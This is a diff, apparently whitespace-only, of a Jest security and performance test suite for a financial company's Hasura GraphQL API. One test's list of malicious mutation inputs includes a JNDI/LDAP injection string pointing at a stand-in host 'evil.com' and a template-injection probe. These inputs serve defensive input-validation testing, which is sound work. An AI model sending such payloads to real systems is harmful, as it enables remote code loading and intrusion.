@@ -45,7 +45,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   basicUserQuery: {
     query: `
       query BasicUserQuery {
@@ -57,7 +57,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   complexValidQuery: {
     query: `
       query ComplexValidQuery {
@@ -78,7 +78,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   overlyComplexQuery: {
     query: `
       query OverlyComplexQuery {
@@ -90,7 +90,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   deepNestedQuery: {
     query: `
       query DeepNestedQuery {
@@ -118,7 +118,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   introspectionQuery: {
     query: `
       query IntrospectionQuery {
@@ -137,7 +137,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   subscriptionQuery: {
     query: `
       subscription UserUpdates {
@@ -149,7 +149,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   mutationQuery: {
     query: `
       mutation CreateUser($email: String!, $name: String!) {
@@ -165,7 +165,7 @@ const testQueries = {
       name: 'Test Mutation User',
     },
   },
-  
+
   largeDataQuery: {
     query: `
       query LargeDataQuery {
@@ -178,7 +178,7 @@ const testQueries = {
       }
     `,
   },
-  
+
   adminQuery: {
     query: `
       query AdminQuery {
@@ -203,10 +203,10 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
   beforeAll(async () => {
     // Initialize database connection
     dbPool = new Pool(config.database);
-    
+
     // Wait for services to be ready
     await waitForGraphQLServices();
-    
+
     // Setup test tokens
     await setupTestTokens();
   });
@@ -214,7 +214,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
   afterAll(async () => {
     // Cleanup test data
     await cleanupTestData();
-    
+
     // Close connections
     await dbPool.end();
   });
@@ -235,7 +235,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         `${config.services.hasura}/v1/config`,
         { validateStatus: () => true }
       );
-      
+
       // Should not expose config in production mode
       expect(configResponse.status).toBeGreaterThanOrEqual(400);
     });
@@ -245,7 +245,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         `${config.services.hasura}/console`,
         { validateStatus: () => true }
       );
-      
+
       // Console should be disabled in production
       expect(consoleResponse.status).toBeGreaterThanOrEqual(400);
     });
@@ -266,7 +266,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
           validateStatus: () => true,
         }
       );
-      
+
       // Should require authentication
       expect(response.status).toBeGreaterThanOrEqual(400);
     });
@@ -281,18 +281,18 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         testQueries.basicUserQuery,
         validJwtToken
       );
-      
+
       expect(response.status).toBeLessThanOrEqual(200);
     });
 
     test('should reject queries with invalid JWT', async () => {
       const invalidToken = 'invalid.jwt.token';
-      
+
       const response = await executeGraphQLQuery(
         testQueries.basicUserQuery,
         invalidToken
       );
-      
+
       expect(response.status).toBeGreaterThanOrEqual(400);
     });
 
@@ -307,7 +307,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         testQueries.basicUserQuery,
         validJwtToken
       );
-      
+
       if (response.status === 200 && response.data.data?.users) {
         // Should only return data the user has permission to see
         expect(Array.isArray(response.data.data.users)).toBe(true);
@@ -325,7 +325,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         testQueries.adminQuery,
         validJwtToken
       );
-      
+
       // Should reject or filter sensitive fields
       expect(response.status).toBeGreaterThanOrEqual(400);
     });
@@ -337,7 +337,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         testQueries.introspectionQuery,
         validJwtToken
       );
-      
+
       // Introspection should be disabled
       expect(response.status).toBeGreaterThanOrEqual(400);
     });
@@ -347,10 +347,10 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         testQueries.overlyComplexQuery,
         validJwtToken
       );
-      
+
       // Should reject overly complex queries
       expect(response.status).toBeGreaterThanOrEqual(400);
-      
+
       if (response.data?.errors) {
         const hasComplexityError = response.data.errors.some((error: any) =>
           error.message.toLowerCase().includes('complexity') ||
@@ -365,7 +365,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         testQueries.deepNestedQuery,
         validJwtToken
       );
-      
+
       // Should reject deeply nested queries
       expect(response.status).toBeGreaterThanOrEqual(400);
     });
@@ -375,7 +375,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         testQueries.largeDataQuery,
         validJwtToken
       );
-      
+
       if (response.status === 200 && response.data.data?.users) {
         // Should enforce maximum row limits
         expect(response.data.data.users.length).toBeLessThanOrEqual(config.security.maxRows);
@@ -397,9 +397,9 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
           }
         `,
       };
-      
+
       const response = await executeGraphQLQuery(customQuery, validJwtToken);
-      
+
       // Should reject non-allow-listed queries
       expect(response.status).toBeGreaterThanOrEqual(400);
     });
@@ -413,15 +413,15 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         { email: '${jndi:ldap://evil.com/a}', name: 'LDAP Injection' },
         { email: '{{7*7}}', name: 'Template Injection' },
       ];
-      
+
       for (const input of maliciousInputs) {
         const maliciousQuery = {
           ...testQueries.mutationQuery,
           variables: input,
         };
-        
+
         const response = await executeGraphQLQuery(maliciousQuery, validJwtToken);
-        
+
         // Should handle malicious input safely
         if (response.status === 200) {
           // If successful, ensure data is properly sanitized
@@ -440,15 +440,15 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         { email: [], name: 'Array Email' },
         { email: {}, name: 'Object Email' },
       ];
-      
+
       for (const variables of invalidVariables) {
         const queryWithInvalidVars = {
           ...testQueries.mutationQuery,
           variables,
         };
-        
+
         const response = await executeGraphQLQuery(queryWithInvalidVars, validJwtToken);
-        
+
         // Should reject invalid variable types
         expect(response.status).toBeGreaterThanOrEqual(400);
       }
@@ -458,34 +458,34 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
   describe('5. Rate Limiting and DoS Protection', () => {
     test('should enforce rate limiting', async () => {
       const requests = Array(20).fill(testQueries.simple);
-      
+
       const responses = await Promise.allSettled(
         requests.map(query => executeGraphQLQuery(query, validJwtToken))
       );
-      
+
       const rateLimitedResponses = responses
         .filter(result => result.status === 'fulfilled')
         .map(result => (result as any).value)
         .filter(response => response.status === 429);
-      
+
       // Should have some rate limiting after many rapid requests
       expect(rateLimitedResponses.length).toBeGreaterThanOrEqual(0);
     });
 
     test('should handle concurrent connections gracefully', async () => {
-      const concurrentQueries = Array(50).fill(null).map(() => 
+      const concurrentQueries = Array(50).fill(null).map(() =>
         executeGraphQLQuery(testQueries.simple, validJwtToken)
       );
-      
+
       const startTime = performance.now();
       const responses = await Promise.allSettled(concurrentQueries);
       const endTime = performance.now();
-      
+
       const successfulResponses = responses
         .filter(result => result.status === 'fulfilled')
         .map(result => (result as any).value)
         .filter(response => response.status < 500);
-      
+
       // Should handle concurrent load gracefully
       expect(successfulResponses.length).toBeGreaterThan(40);
       expect(endTime - startTime).toBeLessThan(10000);
@@ -509,12 +509,12 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
           }
         `,
       };
-      
+
       const startTime = performance.now();
       const response = await executeGraphQLQuery(slowQuery, validJwtToken);
       const endTime = performance.now();
       const queryTime = endTime - startTime;
-      
+
       // Should timeout or complete within reasonable time
       expect(queryTime).toBeLessThan(30000);
       expect(response.status).toBeLessThan(500);
@@ -525,16 +525,16 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
     test('should execute simple queries efficiently', async () => {
       const iterations = 10;
       const queryTimes: number[] = [];
-      
+
       for (let i = 0; i < iterations; i++) {
         const startTime = performance.now();
         const response = await executeGraphQLQuery(testQueries.simple, validJwtToken);
         const endTime = performance.now();
-        
+
         expect(response.status).toBeLessThan(500);
         queryTimes.push(endTime - startTime);
       }
-      
+
       const avgTime = queryTimes.reduce((sum, time) => sum + time, 0) / iterations;
       expect(avgTime).toBeLessThan(config.performance.maxQueryTime);
     });
@@ -545,16 +545,16 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
       const response1 = await executeGraphQLQuery(testQueries.basicUserQuery, validJwtToken);
       const endTime1 = performance.now();
       const firstQueryTime = endTime1 - startTime1;
-      
+
       // Second identical query (should be cached)
       const startTime2 = performance.now();
       const response2 = await executeGraphQLQuery(testQueries.basicUserQuery, validJwtToken);
       const endTime2 = performance.now();
       const secondQueryTime = endTime2 - startTime2;
-      
+
       expect(response1.status).toBeLessThan(500);
       expect(response2.status).toBeLessThan(500);
-      
+
       // Second query should be faster due to caching
       if (response1.status === 200 && response2.status === 200) {
         expect(secondQueryTime).toBeLessThanOrEqual(firstQueryTime * 1.5);
@@ -569,7 +569,7 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
 
       // Test subscription establishment time
       const startTime = performance.now();
-      
+
       try {
         const response = await axios.post(
           `${config.services.hasura}/v1/graphql`,
@@ -583,14 +583,14 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
             validateStatus: () => true,
           }
         );
-        
+
         const endTime = performance.now();
         const subscriptionTime = endTime - startTime;
-        
+
         // Should establish subscription quickly
         expect(subscriptionTime).toBeLessThan(config.performance.maxQueryTime);
         expect(response.status).toBeLessThan(500);
-        
+
       } catch (error) {
         // WebSocket subscriptions might not work in this test environment
         console.warn('Subscription test failed (expected in HTTP-only environment)');
@@ -600,19 +600,19 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
     test('should validate database connection pooling', async () => {
       // Execute multiple queries that would require database connections
       const dbQueries = Array(20).fill(testQueries.basicUserQuery);
-      
+
       const startTime = performance.now();
       const responses = await Promise.all(
         dbQueries.map(query => executeGraphQLQuery(query, validJwtToken))
       );
       const endTime = performance.now();
       const totalTime = endTime - startTime;
-      
+
       // All queries should succeed
       responses.forEach(response => {
         expect(response.status).toBeLessThan(500);
       });
-      
+
       // Connection pooling should make this efficient
       expect(totalTime).toBeLessThan(config.performance.maxQueryTime * 10);
     });
@@ -626,10 +626,10 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
         { query: '' }, // Empty query
         { invalid: 'not a query' }, // Wrong field name
       ];
-      
+
       for (const malformedQuery of malformedQueries) {
         const response = await executeGraphQLQuery(malformedQuery, validJwtToken);
-        
+
         // Should return proper error response
         expect(response.status).toBeGreaterThanOrEqual(400);
         expect(response.data).toHaveProperty('errors');
@@ -646,12 +646,12 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
           }
         `,
       };
-      
+
       const response = await executeGraphQLQuery(invalidQuery, validJwtToken);
-      
+
       expect(response.status).toBeGreaterThanOrEqual(400);
       expect(response.data).toHaveProperty('errors');
-      
+
       if (response.data.errors && response.data.errors.length > 0) {
         const error = response.data.errors[0];
         expect(error).toHaveProperty('message');
@@ -670,12 +670,12 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
           }
         `,
       };
-      
+
       const response = await executeGraphQLQuery(errorInducingQuery, validJwtToken);
-      
+
       if (response.data?.errors) {
         const errorMessage = JSON.stringify(response.data.errors).toLowerCase();
-        
+
         // Should not expose sensitive system information
         expect(errorMessage).not.toMatch(/password|secret|key|token/);
         expect(errorMessage).not.toMatch(/internal server error/);
@@ -686,9 +686,9 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
     test('should log security events appropriately', async () => {
       // This would typically check logs, but we'll test the response
       const suspiciousQuery = testQueries.introspectionQuery;
-      
+
       const response = await executeGraphQLQuery(suspiciousQuery, validJwtToken);
-      
+
       // Should handle security violations properly
       expect(response.status).toBeGreaterThanOrEqual(400);
     });
@@ -699,18 +699,18 @@ describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
 async function waitForGraphQLServices(): Promise<void> {
   const maxAttempts = 20;
   const delay = 3000;
-  
+
   for (let attempt = 1; attempt <= maxAttempts; attempt++) {
     try {
       await axios.get(`${config.services.hasura}/healthz`, { timeout: 5000 });
-      
+
       console.log(`✅ GraphQL services ready (attempt ${attempt}/${maxAttempts})`);
       return;
     } catch (error) {
       if (attempt === maxAttempts) {
         throw new Error(`GraphQL services failed to start after ${maxAttempts} attempts`);
       }
-      
+
       console.log(`⏳ Waiting for GraphQL services... (attempt ${attempt}/${maxAttempts})`);
       await new Promise(resolve => setTimeout(resolve, delay));
     }
@@ -724,7 +724,7 @@ async function setupTestTokens(): Promise<void> {
       `${config.services.core}/auth/jwt/jwks.json`,
       { timeout: 5000 }
     );
-    
+
     if (authResponse.status === 200) {
       // JWT service is available, but we'd need actual authentication flow
       // For testing, we'll use mock tokens or skip token-required tests
@@ -736,17 +736,17 @@ async function setupTestTokens(): Promise<void> {
 }
 
 async function executeGraphQLQuery(
-  query: any, 
+  query: any,
   token?: string
 ): Promise<any> {
   const headers: any = {
     'Content-Type': 'application/json',
   };
-  
+
   if (token) {
     headers['Authorization'] = `Bearer ${token}`;
   }
-  
+
   return axios.post(
     `${config.services.hasura}/v1/graphql`,
     query,
@@ -764,13 +764,13 @@ async function cleanupTestData(): Promise<void> {
     if (testUserId) {
       await dbPool.query('DELETE FROM auth.users WHERE id = $1', [testUserId]);
     }
-    
+
     // Clean up test users by email pattern
     await dbPool.query(`
-      DELETE FROM auth.users 
+      DELETE FROM auth.users
       WHERE email LIKE '%atlas-test.local'
     `);
-    
+
   } catch (error) {
     console.warn('Failed to cleanup test data:', error);
   }
